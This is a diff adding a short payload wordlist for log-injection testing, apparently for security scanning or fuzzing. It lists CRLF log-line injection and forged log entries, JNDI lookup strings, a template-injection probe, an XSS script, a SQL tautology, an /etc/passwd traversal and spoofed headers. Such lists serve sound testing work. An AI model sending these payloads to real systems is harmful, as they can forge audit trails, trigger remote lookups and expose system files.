@@ -1,0 +1,16 @@
+# Log injection advanced payloads
+%0aINJECTED_LOG_LINE
+%0d%0aINJECTED_LOG_LINE
+\nINJECTED_LOG_LINE
+\r\nINJECTED_LOG_LINE
+INFO forged log entry
+ERROR forged exception
+127.0.0.1 - admin [01/Jan/2030:00:00:00 +0000] "GET /admin HTTP/1.1" 200
+${jndi:ldap://127.0.0.1/a}
+${jndi:dns://127.0.0.1/a}
+{{7*7}}
+<script>alert(1)</script>
+' OR '1'='1
+../../../../etc/passwd
+User-Agent: injected
+X-Forwarded-For: 127.0.0.1
